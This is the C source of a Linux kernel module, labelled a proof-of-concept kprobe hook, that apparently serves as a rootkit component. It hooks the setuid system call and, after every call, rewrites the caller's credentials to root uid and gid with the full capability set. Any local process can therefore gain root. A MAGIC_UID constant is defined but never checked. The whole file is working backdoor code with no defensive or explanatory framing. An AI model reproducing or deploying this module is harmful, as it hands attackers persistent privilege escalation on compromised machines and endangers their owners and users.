#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/atomic.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/capability.h>

MODULE_AUTHOR("humzak711");
MODULE_DESCRIPTION("POC kprobe hook");
MODULE_LICENSE("GPL");

atomic_t hooked = ATOMIC_INIT(0);

#define MAGIC_UID 50

#define _GLOBAL_ROOT_UID 0
#define _GLOBAL_ROOT_GID 0

void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs,
                                 unsigned long flags)
{
    printk(KERN_INFO "setuid hook called, elevating privs...");

    struct cred *new_creds = prepare_creds();

    /* uid privesc */
    new_creds->uid.val=_GLOBAL_ROOT_UID;
    new_creds->euid.val=_GLOBAL_ROOT_UID;
    new_creds->suid.val=_GLOBAL_ROOT_UID;
    new_creds->fsuid.val=_GLOBAL_ROOT_UID;

    /* gid privesc */
    new_creds->gid.val=_GLOBAL_ROOT_GID;
    new_creds->egid.val=_GLOBAL_ROOT_GID;
    new_creds->sgid.val=_GLOBAL_ROOT_GID;
    new_creds->fsgid.val=_GLOBAL_ROOT_GID;

    /* capabilities privesc */
    new_creds->cap_inheritable=CAP_FULL_SET;
    new_creds->cap_permitted=CAP_FULL_SET;
    new_creds->cap_effective=CAP_FULL_SET;
    new_creds->cap_bset=CAP_FULL_SET;
    commit_creds(new_creds);
}

struct kprobe __x64_sys_setuid_hook = {
    .symbol_name = "__x64_sys_setuid",
    .post_handler = __x64_sys_setuid_post_handler,
};

static int __init rkin(void)
{
    printk(KERN_INFO "module loaded\n");
    int registered = register_kprobe(&__x64_sys_setuid_hook);
    if (registered < 0)
    {
        printk(KERN_INFO "failed to register kprobe\n");
    }
    else
    {
        printk(KERN_INFO "hooked\n");
        atomic_inc(&hooked);
    }

    return 0;
}

static void __exit rkout(void)
{
    if (atomic_read(&hooked))
    {
        unregister_kprobe(&__x64_sys_setuid_hook);
        printk(KERN_INFO "unhooked\n");
    }
}

module_init(rkin);
module_exit(rkout);